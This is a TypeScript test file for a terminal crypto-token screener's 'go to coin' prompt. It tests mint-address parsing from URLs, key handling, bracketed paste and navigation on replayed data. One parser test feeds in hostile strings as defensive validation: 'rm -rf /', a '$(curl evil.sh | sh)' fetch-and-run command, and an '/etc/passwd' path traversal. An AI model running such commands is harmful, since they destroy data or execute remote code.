// task-1388 GO-TO prompt: `g` on the screener / new pairs / watchlist / token screens opens a one-line input;
// paste or type a base58 mint (or a dexscreener / pump.fun / solscan URL) and ⏎ opens that coin's LIVE token
// screen through the same read-only path --screen token --mint uses (live.openToken(seedForMint(...)) with an
// unknown-launchpad stub). Esc cancels, a bad address shows a notice and changes nothing, and nothing here can
// trade or sign. These tests cover the pure parser, the keymap wiring, the key capture (incl. a 44-char paste
// and bracketed-paste markers), a hostile-input case, and the open flow on a replay-backed live context.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { applyAction, applyKey, parseMintTarget } from '../src/main.ts';
import { makeFixtureState, makeFeedState, type AppState } from '../src/state.ts';
import { DEFAULT_KEYMAP, parseKeys } from '@dexterm/tui';
import { helpRows } from '../src/screens/overlay.ts';
import { createReplayFeed } from '../src/feed.ts';
import { LiveContext } from '../src/live/index.ts';

// network must never be touched by these tests
globalThis.fetch = (async (input: unknown) => { throw new Error(`network access blocked in tests: ${String(input)}`); }) as typeof fetch;

const here = dirname(fileURLToPath(import.meta.url));
const SAMPLE = resolve(here, '..', '..', 'data', 'fixtures', 'live-sample.json');
const BONK = 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263';
// the real DEXTERM contract address the card asks the pty run to open (44-char base58, launchpad `pump`)
const DEXTERM = '2huJ1cxDXpGrh2bPYxptaoLj89to8CnzdVC5aYTEpump';

/** Feed every key a raw stdin chunk decodes to through applyKey, in order (as the interactive loop does). */
function keys(state: AppState, s: string, stack: string[] = []): void { for (const k of parseKeys(s)) applyKey(state, k, stack as never); }

// ---------------------------------------------------------------- parseMintTarget (pure)

test('parseMintTarget: a bare base58 mint passes through unchanged', () => {
  assert.equal(parseMintTarget(DEXTERM), DEXTERM);
  assert.equal(parseMintTarget(BONK), BONK);
  assert.equal(parseMintTarget(`  ${DEXTERM}  `), DEXTERM, 'surrounding whitespace is trimmed');
});

test('parseMintTarget: extracts the mint from coin URLs', () => {
  assert.equal(parseMintTarget(`https://pump.fun/coin/${DEXTERM}`), DEXTERM);
  assert.equal(parseMintTarget(`https://pump.fun/${DEXTERM}`), DEXTERM);
  assert.equal(parseMintTarget(`https://solscan.io/token/${DEXTERM}`), DEXTERM);
  assert.equal(parseMintTarget(`https://solscan.io/account/${DEXTERM}?cluster=mainnet`), DEXTERM);
  assert.equal(parseMintTarget(`https://dexscreener.com/solana/${DEXTERM}`), DEXTERM);
  assert.equal(parseMintTarget(`dexscreener.com/solana/${BONK}`), BONK, 'no scheme is fine');
});

test('parseMintTarget: rejects anything that is not a mint, and never slices a longer run', () => {
  assert.equal(parseMintTarget(''), null);
  assert.equal(parseMintTarget('   '), null);
  assert.equal(parseMintTarget('nope'), null);
  assert.equal(parseMintTarget('SOL'), null);
  assert.equal(parseMintTarget(DEXTERM.slice(0, 31)), null, '31 chars is too short');
  // a 50-char base58 run is NOT a 32-44 mint and must not be truncated into one
  assert.equal(parseMintTarget('1'.repeat(50)), null);
  // hostile input: shell metacharacters, quotes, a path — no base58 mint, so null (and no throw)
  assert.equal(parseMintTarget(`"; rm -rf / #`), null);
  assert.equal(parseMintTarget(`$(curl evil.sh | sh)`), null);
  assert.equal(parseMintTarget(`../../etc/passwd`), null);
  // 0/O/I/l are not base58, so they split tokens rather than merge a mint with its neighbours
  assert.equal(parseMintTarget(`O${DEXTERM}`), DEXTERM, 'a leading non-base58 char is a delimiter');
  assert.equal(parseMintTarget(`${DEXTERM}\nextra junk`), DEXTERM);
});

// ---------------------------------------------------------------- keymap wiring

test('keymap: g is goto.open on the four screens; home keeps move.top; other screens keep g = move.top', () => {
  for (const s of ['screener', 'newpairs', 'watchlist', 'token']) {
    assert.equal(DEFAULT_KEYMAP.resolveId('g', s), 'goto.open', `g on ${s}`);
    assert.equal(DEFAULT_KEYMAP.resolveId('home', s), 'move.top', `home still tops on ${s}`);
  }
  assert.equal(DEFAULT_KEYMAP.resolveId('g', 'analyst'), 'move.top', 'g elsewhere is unchanged');
  assert.equal(DEFAULT_KEYMAP.resolveId('g'), 'move.top', 'the global g is still move.top');
  // decode a real `g` chunk and resolve it per-screen
  assert.equal(DEFAULT_KEYMAP.resolve(parseKeys('g')[0], 'screener'), 'goto.open');
});

test('help overlay: the four screens list "go to coin" (g) and still list "top" (home)', () => {
  for (const s of ['screener', 'newpairs', 'watchlist', 'token'] as const) {
    const rows = helpRows(s, false);
    assert.ok(rows.some((r) => r.keys === 'g' && /go to coin/.test(r.label)), `${s} help shows g = go to coin`);
    assert.ok(rows.some((r) => r.label === 'top'), `${s} help still has a top row (home)`);
  }
});

// ---------------------------------------------------------------- key capture (via applyKey)

test('goto.open opens the prompt; a 44-char paste lands whole; q/digits never leak out', () => {
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  assert.deepEqual(state.goto, { input: '', notice: null });
  // a terminal paste arrives as ONE raw chunk of printable chars (parseKeys has no bracketed-paste state)
  keys(state, DEXTERM);
  assert.equal(state.goto!.input, DEXTERM, 'the whole 44-char mint accumulated');
  assert.equal(state.screen, 'screener', 'still on the screener while typing');
  // q and 1-4 are swallowed into the input, never quitting or switching screens
  applyAction(state, 'goto.open', []); // reopen empty
  keys(state, 'q1234');
  assert.equal(state.goto!.input, 'q1234');
  assert.equal(state.screen, 'screener');
});

test('esc cancels, ctrl+u clears, backspace deletes and clears the notice', () => {
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  keys(state, 'abc');
  assert.equal(state.goto!.input, 'abc');
  keys(state, '\u0015'); // ctrl+u
  assert.equal(state.goto!.input, '');
  keys(state, 'xy');
  keys(state, '\u007f'); // backspace
  assert.equal(state.goto!.input, 'x');
  keys(state, '\u001b'); // esc
  assert.equal(state.goto, null, 'esc closes the prompt');
});

test('bracketed-paste markers are ignored, so a wrapped paste still lands the mint', () => {
  // ESC [ 200~  <text>  ESC [ 201~ : parseKeys must emit only the inner printable chars, never an esc.
  const decoded = parseKeys(`\u001b[200~${DEXTERM}\u001b[201~`);
  assert.ok(decoded.every((k) => k.name === 'char'), 'no esc from the markers');
  assert.equal(decoded.map((k) => k.ch).join(''), DEXTERM);
  assert.deepEqual(parseKeys('\u001b[200~'), [], 'the start marker alone decodes to nothing');
  assert.deepEqual(parseKeys('\u001b[201~'), [], 'the end marker alone decodes to nothing');
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  keys(state, `\u001b[200~${DEXTERM}\u001b[201~`);
  assert.equal(state.goto!.input, DEXTERM);
  assert.equal(state.screen, 'screener', 'the markers did not cancel the prompt');
});

test('bad input shows a notice and changes nothing; the prompt stays open', () => {
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  keys(state, 'not-a-mint\r');
  assert.ok(state.goto, 'the prompt stays open after a bad address');
  assert.match(state.goto!.notice!, /not a contract address/);
  assert.equal(state.screen, 'screener');
});

test('on fixtures, opening a coin by address honestly needs live mode', () => {
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  keys(state, `${DEXTERM}\r`);
  assert.ok(state.goto, 'still open');
  assert.match(state.goto!.notice!, /needs live mode/);
  assert.equal(state.screen, 'screener');
});

test('empty ⏎ just closes the prompt (no navigation)', () => {
  const state = makeFixtureState({ screen: 'screener' });
  applyAction(state, 'goto.open', []);
  keys(state, '\r');
  assert.equal(state.goto, null);
  assert.equal(state.screen, 'screener');
});

// ---------------------------------------------------------------- open flow (replay-backed live)

test('live: typing the DEXTERM CA and ⏎ opens its token screen with an unknown-launchpad stub', async () => {
  const feed = createReplayFeed(SAMPLE);
  await feed.refresh();
  const state = makeFeedState(feed, 'replay', { screen: 'screener' });
  state.live = new LiveContext(feed.dl, { mode: 'replay' });
  try {
    const stack: string[] = [];
    applyAction(state, 'goto.open', stack as never);
    keys(state, `${DEXTERM}\r`, stack);
    assert.equal(state.screen, 'token', 'navigated to the token screen');
    assert.equal(state.goto, null, 'the prompt closed');
    assert.equal(state.live.token?.view.mint, DEXTERM);
    assert.equal(state.live.token?.view.launchpad, 'unknown', 'unknown-launchpad stub seed');
    assert.deepEqual(stack, ['screener'], 'the screener was pushed on the stack');
  } finally {
    state.live.close();
    feed.close();
  }
});

test('live: a known on-feed mint opens via seedForMint (real symbol, not a stub)', async () => {
  const feed = createReplayFeed(SAMPLE);
  await feed.refresh();
  const state = makeFeedState(feed, 'replay', { screen: 'newpairs' });
  state.live = new LiveContext(feed.dl, { mode: 'replay' });
  try {
    applyAction(state, 'goto.open', []);
    keys(state, `${BONK}\r`);
    assert.equal(state.screen, 'token');
    assert.equal(state.live.token?.view.mint, BONK);
  } finally {
    state.live.close();
    feed.close();
  }
});

test('live: a bad address on a live screen shows a notice and never leaves the current screen', async () => {
  const feed = createReplayFeed(SAMPLE);
  await feed.refresh();
  const state = makeFeedState(feed, 'replay', { screen: 'screener' });
  state.live = new LiveContext(feed.dl, { mode: 'replay' });
  try {
    applyAction(state, 'goto.open', []);
    keys(state, `deadbeef\r`);
    assert.equal(state.screen, 'screener');
    assert.ok(state.goto);
    assert.match(state.goto!.notice!, /not a contract address/);
    assert.ok(!state.live.token, 'no token was opened');
  } finally {
    state.live.close();
    feed.close();
  }
});
